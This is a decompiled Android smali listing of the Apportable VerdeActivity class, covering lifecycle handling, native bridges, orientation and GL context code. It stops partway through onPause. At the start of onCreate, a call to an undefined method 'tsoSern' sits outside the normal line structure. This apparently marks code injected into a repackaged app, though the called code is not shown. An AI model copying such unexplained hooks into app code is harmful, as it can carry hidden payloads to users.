.class public Lcom/apportable/activity/VerdeActivity;
.super Lcom/apportable/activity/AccelerometerActivity;
.source "VerdeActivity.java"


# static fields
.field private static TAG:Ljava/lang/String;

.field private static theVerdeActivity:Lcom/apportable/activity/VerdeActivity;


# instance fields
.field private mContentHeight:I

.field private mContentWidth:I

.field private mCurrentSplashPath:Ljava/lang/String;

.field private mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

.field private mPaused:Z

.field private mRequestedOrientation:I

.field private mScalingFactor:F

.field private rootOfAllEvil:Landroid/widget/FrameLayout;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 55
    const-string v0, "VerdeActivity"

    sput-object v0, Lcom/apportable/activity/VerdeActivity;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .registers 2

    .prologue
    const/4 v0, 0x0

    .line 82
    invoke-direct {p0}, Lcom/apportable/activity/AccelerometerActivity;-><init>()V

    .line 61
    iput-boolean v0, p0, Lcom/apportable/activity/VerdeActivity;->mPaused:Z

    .line 63
    iput v0, p0, Lcom/apportable/activity/VerdeActivity;->mContentWidth:I

    .line 64
    iput v0, p0, Lcom/apportable/activity/VerdeActivity;->mContentHeight:I

    .line 83
    sput-object p0, Lcom/apportable/activity/VerdeActivity;->theVerdeActivity:Lcom/apportable/activity/VerdeActivity;

    .line 84
    return-void
.end method

.method static synthetic access$000(Lcom/apportable/activity/VerdeActivity;)Lcom/apportable/activity/BGLibraryLoader;
    .registers 2

    .prologue
    .line 54
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    return-object v0
.end method

.method static synthetic access$100(Lcom/apportable/activity/VerdeActivity;)V
    .registers 1

    .prologue
    .line 54
    invoke-direct {p0}, Lcom/apportable/activity/VerdeActivity;->nativeRootGeometryChanged()V

    return-void
.end method

.method static synthetic access$1000()V
    .registers 0

    .prologue
    .line 54
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnPause()V

    return-void
.end method

.method static synthetic access$1100()V
    .registers 0

    .prologue
    .line 54
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnStop()V

    return-void
.end method

.method static synthetic access$1200()V
    .registers 0

    .prologue
    .line 54
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnRestart()V

    return-void
.end method

.method static synthetic access$1300()V
    .registers 0

    .prologue
    .line 54
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnDestroy()V

    return-void
.end method

.method static synthetic access$1400(Landroid/content/res/Configuration;)V
    .registers 1

    .prologue
    .line 54
    invoke-static {p0}, Lcom/apportable/activity/VerdeActivity;->nativeOnConfigurationChanged(Landroid/content/res/Configuration;)V

    return-void
.end method

.method static synthetic access$1502(Lcom/apportable/activity/VerdeActivity;I)I
    .registers 2

    .prologue
    .line 54
    iput p1, p0, Lcom/apportable/activity/VerdeActivity;->mContentWidth:I

    return p1
.end method

.method static synthetic access$1602(Lcom/apportable/activity/VerdeActivity;I)I
    .registers 2

    .prologue
    .line 54
    iput p1, p0, Lcom/apportable/activity/VerdeActivity;->mContentHeight:I

    return p1
.end method

.method static synthetic access$200(Lcom/apportable/activity/VerdeActivity;)Landroid/widget/FrameLayout;
    .registers 2

    .prologue
    .line 54
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->rootOfAllEvil:Landroid/widget/FrameLayout;

    return-object v0
.end method

.method static synthetic access$300(II)V
    .registers 2

    .prologue
    .line 54
    invoke-static {p0, p1}, Lcom/apportable/activity/VerdeActivity;->nativeOnSoftKeyboardChanged(II)V

    return-void
.end method

.method static synthetic access$400(Ljava/lang/String;)V
    .registers 1

    .prologue
    .line 54
    invoke-static {p0}, Lcom/apportable/activity/VerdeActivity;->nativeOnCreate(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$500(Ljava/lang/String;)V
    .registers 1

    .prologue
    .line 54
    invoke-static {p0}, Lcom/apportable/activity/VerdeActivity;->nativeHandleUri(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$600()Ljava/lang/String;
    .registers 1

    .prologue
    .line 54
    sget-object v0, Lcom/apportable/activity/VerdeActivity;->TAG:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$700(Lcom/apportable/activity/VerdeActivity;)Z
    .registers 2

    .prologue
    .line 54
    iget-boolean v0, p0, Lcom/apportable/activity/VerdeActivity;->mPaused:Z

    return v0
.end method

.method static synthetic access$702(Lcom/apportable/activity/VerdeActivity;Z)Z
    .registers 2

    .prologue
    .line 54
    iput-boolean p1, p0, Lcom/apportable/activity/VerdeActivity;->mPaused:Z

    return p1
.end method

.method static synthetic access$800()V
    .registers 0

    .prologue
    .line 54
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnStart()V

    return-void
.end method

.method static synthetic access$900()V
    .registers 0

    .prologue
    .line 54
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnResume()V

    return-void
.end method

.method public static getActivity()Lcom/apportable/activity/VerdeActivity;
    .registers 1

    .prologue
    .line 87
    sget-object v0, Lcom/apportable/activity/VerdeActivity;->theVerdeActivity:Lcom/apportable/activity/VerdeActivity;

    return-object v0
.end method

.method private static native nativeHandleUri(Ljava/lang/String;)V
.end method

.method private static native nativeOnActivityResult(IILandroid/content/Intent;)V
.end method

.method private static native nativeOnConfigurationChanged(Landroid/content/res/Configuration;)V
.end method

.method private static native nativeOnCreate(Ljava/lang/String;)V
.end method

.method private static native nativeOnDestroy()V
.end method

.method private static native nativeOnLowMemory()V
.end method

.method private static native nativeOnPause()V
.end method

.method private static native nativeOnRestart()V
.end method

.method private static native nativeOnResume()V
.end method

.method private static native nativeOnSoftKeyboardChanged(II)V
.end method

.method private static native nativeOnStart()V
.end method

.method private static native nativeOnStop()V
.end method

.method private native nativeRootGeometryChanged()V
.end method

.method private static native nativeSetEnv(Ljava/lang/String;Ljava/lang/String;)V
.end method

.method private prefsUuid()Ljava/lang/String;
    .registers 4

    .prologue
    .line 360
    const/4 v0, 0x0

    invoke-virtual {p0, v0}, Lcom/apportable/activity/VerdeActivity;->getPreferences(I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 361
    const-string v1, ""

    .line 362
    const-string v1, "_uuid_"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_28

    .line 363
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 364
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v0

    .line 365
    const-string v2, "_uuid_"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 366
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 370
    :goto_27
    return-object v0

    .line 368
    :cond_28
    const-string v1, "_uuid_"

    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_27
.end method


# virtual methods
.method public _cacheDir()Ljava/lang/String;
    .registers 2

    .prologue
    .line 618
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getCacheDir()Ljava/io/File;

    move-result-object v0

    .line 619
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public _getRequestedOrientation()I
    .registers 2

    .prologue
    .line 456
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getRequestedOrientation()I

    move-result v0

    sparse-switch v0, :sswitch_data_12

    .line 466
    const/4 v0, 0x0

    :goto_8
    return v0

    .line 458
    :sswitch_9
    const/4 v0, 0x1

    goto :goto_8

    .line 460
    :sswitch_b
    const/4 v0, 0x2

    goto :goto_8

    .line 462
    :sswitch_d
    const/4 v0, 0x3

    goto :goto_8

    .line 464
    :sswitch_f
    const/4 v0, 0x4

    goto :goto_8

    .line 456
    nop

    :sswitch_data_12
    .sparse-switch
        0x0 -> :sswitch_d
        0x1 -> :sswitch_9
        0x8 -> :sswitch_f
        0x9 -> :sswitch_b
    .end sparse-switch
.end method

.method public _setRequestedOrientation(I)V
    .registers 6

    .prologue
    const/4 v3, 0x1

    const/4 v2, 0x0

    const/16 v1, 0x8

    .line 471
    packed-switch p1, :pswitch_data_2a

    .line 491
    :goto_7
    iget v0, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    invoke-virtual {p0, v0}, Lcom/apportable/activity/VerdeActivity;->setRequestedOrientation(I)V

    .line 492
    return-void

    .line 473
    :pswitch_d
    iput v3, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    goto :goto_7

    .line 476
    :pswitch_10
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-le v0, v1, :cond_19

    .line 477
    const/16 v0, 0x9

    iput v0, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    goto :goto_7

    .line 479
    :cond_19
    iput v3, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    goto :goto_7

    .line 482
    :pswitch_1c
    iput v2, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    goto :goto_7

    .line 485
    :pswitch_1f
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-le v0, v1, :cond_26

    .line 486
    iput v1, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    goto :goto_7

    .line 488
    :cond_26
    iput v2, p0, Lcom/apportable/activity/VerdeActivity;->mRequestedOrientation:I

    goto :goto_7

    .line 471
    nop

    :pswitch_data_2a
    .packed-switch 0x1
        :pswitch_d
        :pswitch_10
        :pswitch_1c
        :pswitch_1f
    .end packed-switch
.end method

.method public addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    .registers 5

    .prologue
    .line 219
    new-instance v0, Lcom/apportable/activity/VerdeActivity$4;

    invoke-direct {v0, p0, p1, p2}, Lcom/apportable/activity/VerdeActivity$4;-><init>(Lcom/apportable/activity/VerdeActivity;Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lcom/apportable/activity/VerdeActivity;->runOnThread(Ljava/lang/Runnable;I)V

    .line 228
    return-void
.end method

.method public canSendEmail()Z
    .registers 6

    .prologue
    const/4 v1, 0x0

    .line 495
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.intent.action.SEND"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 496
    const-string v2, "message/rfc822"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setType(Ljava/lang/String;)Landroid/content/Intent;

    .line 497
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v2, v0, v1}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v2

    .line 499
    sget-object v3, Lcom/apportable/activity/VerdeActivity;->TAG:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "canSendEmail:"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v0

    if-eqz v0, :cond_3d

    const-string v0, "yes"

    :goto_2a
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 500
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v0

    if-eqz v0, :cond_40

    const/4 v0, 0x1

    :goto_3c
    return v0

    .line 499
    :cond_3d
    const-string v0, "no"

    goto :goto_2a

    :cond_40
    move v0, v1

    .line 500
    goto :goto_3c
.end method

.method public createSharedContext(ILjavax/microedition/khronos/egl/EGLContext;)Ljavax/microedition/khronos/egl/EGLContext;
    .registers 4

    .prologue
    .line 567
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getSurface()Lcom/apportable/gl/GLSurfaceView;

    move-result-object v0

    invoke-virtual {v0, p1, p2}, Lcom/apportable/gl/GLSurfaceView;->createSharedContext(ILjavax/microedition/khronos/egl/EGLContext;)Ljavax/microedition/khronos/egl/EGLContext;

    move-result-object v0

    return-object v0
.end method

.method public destroyContext(Ljavax/microedition/khronos/egl/EGLContext;)Z
    .registers 3

    .prologue
    .line 571
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getSurface()Lcom/apportable/gl/GLSurfaceView;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/apportable/gl/GLSurfaceView;->destroyContext(Ljavax/microedition/khronos/egl/EGLContext;)Z

    move-result v0

    return v0
.end method

.method public flushMetrics()V
    .registers 1

    .prologue
    .line 402
    invoke-static {}, Lcom/apportable/CrashReporter;->flushMetrics()V

    .line 403
    return-void
.end method

.method public gc()V
    .registers 1

    .prologue
    .line 391
    return-void
.end method

.method public getAttributionId()Ljava/lang/String;
    .registers 7

    .prologue
    const/4 v3, 0x0

    .line 667
    const/4 v0, 0x1

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "aid"

    aput-object v1, v2, v0

    .line 668
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://com.facebook.katana.provider.AttributionIdProvider"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    .line 669
    if-eqz v0, :cond_21

    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-nez v1, :cond_22

    .line 674
    :cond_21
    :goto_21
    return-object v3

    .line 672
    :cond_22
    const-string v1, "aid"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 673
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    goto :goto_21
.end method

.method public getContentHeight()I
    .registers 2

    .prologue
    .line 642
    iget v0, p0, Lcom/apportable/activity/VerdeActivity;->mContentHeight:I

    if-lez v0, :cond_7

    iget v0, p0, Lcom/apportable/activity/VerdeActivity;->mContentHeight:I

    :goto_6
    return v0

    :cond_7
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getScreenHeight()I

    move-result v0

    goto :goto_6
.end method

.method public getContentWidth()I
    .registers 2

    .prologue
    .line 638
    iget v0, p0, Lcom/apportable/activity/VerdeActivity;->mContentWidth:I

    if-lez v0, :cond_7

    iget v0, p0, Lcom/apportable/activity/VerdeActivity;->mContentWidth:I

    :goto_6
    return v0

    :cond_7
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getScreenWidth()I

    move-result v0

    goto :goto_6
.end method

.method public getPrimaryContext()Ljavax/microedition/khronos/egl/EGLContext;
    .registers 2

    .prologue
    .line 559
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getSurface()Lcom/apportable/gl/GLSurfaceView;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/gl/GLSurfaceView;->getPrimaryContext()Ljavax/microedition/khronos/egl/EGLContext;

    move-result-object v0

    return-object v0
.end method

.method public getScreenHeight()I
    .registers 2

    .prologue
    .line 650
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->rootOfAllEvil:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/widget/FrameLayout;->getMeasuredHeight()I

    move-result v0

    return v0
.end method

.method public getScreenWidth()I
    .registers 2

    .prologue
    .line 646
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->rootOfAllEvil:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/widget/FrameLayout;->getMeasuredWidth()I

    move-result v0

    return v0
.end method

.method public getSplashScreenHeight()I
    .registers 2

    .prologue
    .line 661
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Display;->getHeight()I

    move-result v0

    int-to-float v0, v0

    .line 662
    float-to-int v0, v0

    return v0
.end method

.method public getSplashScreenWidth()I
    .registers 2

    .prologue
    .line 655
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Display;->getWidth()I

    move-result v0

    int-to-float v0, v0

    .line 656
    float-to-int v0, v0

    return v0
.end method

.method public hasActivityForAction(Ljava/lang/String;)Z
    .registers 5

    .prologue
    .line 434
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 435
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/high16 v2, 0x10000

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v0

    .line 436
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_17

    const/4 v0, 0x1

    :goto_16
    return v0

    :cond_17
    const/4 v0, 0x0

    goto :goto_16
.end method

.method public hasSystemFeature(Ljava/lang/String;)I
    .registers 3

    .prologue
    .line 425
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 426
    const/4 v0, 0x1

    .line 428
    :goto_b
    return v0

    :cond_c
    const/4 v0, 0x0

    goto :goto_b
.end method

.method public makeCurrentContext(Ljavax/microedition/khronos/egl/EGLContext;)Z
    .registers 3

    .prologue
    .line 563
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getSurface()Lcom/apportable/gl/GLSurfaceView;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/apportable/gl/GLSurfaceView;->makeCurrentContext(Ljavax/microedition/khronos/egl/EGLContext;)Z

    move-result v0

    return v0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .registers 9

    .prologue
    .line 544
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    invoke-virtual {v0}, Lcom/apportable/activity/BGLibraryLoader;->isLoaded()Z

    move-result v0

    if-eqz v0, :cond_b

    .line 545
    invoke-static {p1, p2, p3}, Lcom/apportable/activity/VerdeActivity;->nativeOnActivityResult(IILandroid/content/Intent;)V

    .line 548
    :cond_b
    :try_start_b
    const-string v0, "com.apportable.iap.ApportableIAP"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 549
    if-eqz v0, :cond_43

    .line 550
    const-string v1, "handleActivityResult"

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    sget-object v4, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    sget-object v4, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-class v4, Landroid/content/Intent;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 551
    const/4 v1, 0x0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x2

    aput-object p3, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_43
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_43} :catch_44

    .line 556
    :cond_43
    :goto_43
    return-void

    .line 553
    :catch_44
    move-exception v0

    .line 554
    sget-object v1, Lcom/apportable/activity/VerdeActivity;->TAG:Ljava/lang/String;

    const-string v2, "onActivityResult raised an exception"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_43
.end method

.method public onConfigurationChanged(Landroid/content/res/Configuration;)V
    .registers 4

    .prologue
    .line 347
    invoke-super {p0, p1}, Lcom/apportable/activity/AccelerometerActivity;->onConfigurationChanged(Landroid/content/res/Configuration;)V

    .line 349
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    invoke-virtual {v0}, Lcom/apportable/activity/BGLibraryLoader;->isLoaded()Z

    move-result v0

    if-eqz v0, :cond_14

    .line 350
    new-instance v0, Lcom/apportable/activity/VerdeActivity$11;

    invoke-direct {v0, p0, p1}, Lcom/apportable/activity/VerdeActivity$11;-><init>(Lcom/apportable/activity/VerdeActivity;Landroid/content/res/Configuration;)V

    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lcom/apportable/activity/VerdeActivity;->runOnThread(Ljava/lang/Runnable;I)V

    .line 357
    :cond_14
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5

    .prologue
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->tsoSern()V

    const/16 v2, 0x400

    .line 92
    invoke-super {p0, p1}, Lcom/apportable/activity/AccelerometerActivity;->onCreate(Landroid/os/Bundle;)V

    .line 95
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/view/Window;->requestFeature(I)Z

    .line 96
    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0, v2, v2}, Landroid/view/Window;->setFlags(II)V

    .line 98
    new-instance v0, Lcom/apportable/activity/BGLibraryLoader;

    invoke-direct {v0}, Lcom/apportable/activity/BGLibraryLoader;-><init>()V

    iput-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    .line 100
    new-instance v0, Lcom/apportable/activity/VerdeActivity$1;

    invoke-direct {v0, p0, p0}, Lcom/apportable/activity/VerdeActivity$1;-><init>(Lcom/apportable/activity/VerdeActivity;Landroid/content/Context;)V

    iput-object v0, p0, Lcom/apportable/activity/VerdeActivity;->rootOfAllEvil:Landroid/widget/FrameLayout;

    .line 111
    invoke-static {}, Lcom/apportable/CrashReporter;->setupTracking()V

    .line 113
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->rootOfAllEvil:Landroid/widget/FrameLayout;

    invoke-static {v0}, Lcom/apportable/app/SplashScreen;->show(Landroid/widget/FrameLayout;)V

    .line 115
    invoke-static {p0}, Lcom/android/ViewServer;->get(Landroid/content/Context;)Lcom/android/ViewServer;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/android/ViewServer;->addWindow(Landroid/app/Activity;)V

    .line 117
    invoke-static {}, Lcom/apportable/MainThread;->start()V

    .line 118
    new-instance v0, Lcom/apportable/activity/ExpansionFileDownloader;

    invoke-direct {v0}, Lcom/apportable/activity/ExpansionFileDownloader;-><init>()V

    .line 119
    new-instance v1, Lcom/apportable/activity/VerdeActivity$2;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$2;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, p0, v1}, Lcom/apportable/activity/ExpansionFileDownloader;->load(Landroid/app/Activity;Lcom/apportable/activity/ExpansionFileDownloader$Callback;)V

    .line 171
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$3;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$3;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onCreate(Ljava/lang/Runnable;)V

    .line 215
    return-void
.end method

.method protected onDestroy()V
    .registers 3

    .prologue
    .line 322
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onDestroy()V

    .line 324
    invoke-static {p0}, Lcom/android/ViewServer;->get(Landroid/content/Context;)Lcom/android/ViewServer;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/android/ViewServer;->removeWindow(Landroid/app/Activity;)V

    .line 325
    invoke-static {}, Lcom/apportable/CrashReporter;->onDestroy()V

    .line 327
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$10;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$10;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onDestroy(Ljava/lang/Runnable;)V

    .line 334
    return-void
.end method

.method public onLowMemory()V
    .registers 2

    .prologue
    .line 338
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onLowMemory()V

    .line 340
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    invoke-virtual {v0}, Lcom/apportable/activity/BGLibraryLoader;->isLoaded()Z

    move-result v0

    if-eqz v0, :cond_e

    .line 341
    invoke-static {}, Lcom/apportable/activity/VerdeActivity;->nativeOnLowMemory()V

    .line 343
    :cond_e
    return-void
.end method

.method protected onNewIntent(Landroid/content/Intent;)V
    .registers 4

    .prologue
    .line 580
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$12;

    invoke-direct {v1, p0, p1}, Lcom/apportable/activity/VerdeActivity$12;-><init>(Lcom/apportable/activity/VerdeActivity;Landroid/content/Intent;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onNewIntent(Ljava/lang/Runnable;)V

    .line 615
    return-void
.end method

.method protected onPause()V
    .registers 3

    .prologue
    .line 267
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onPause()V

    .line 269
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    invoke-virtual {v0}, Lcom/apportable/activity/BGLibraryLoader;->isLoaded()Z

    move-result v0

    if-eqz v0, :cond_15

    invoke-static {}, Lcom/apportable/app/SplashScreen;->isShown()Z

    move-result v0

    if-eqz v0, :cond_15

    .line 278
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/System;->exit(I)V

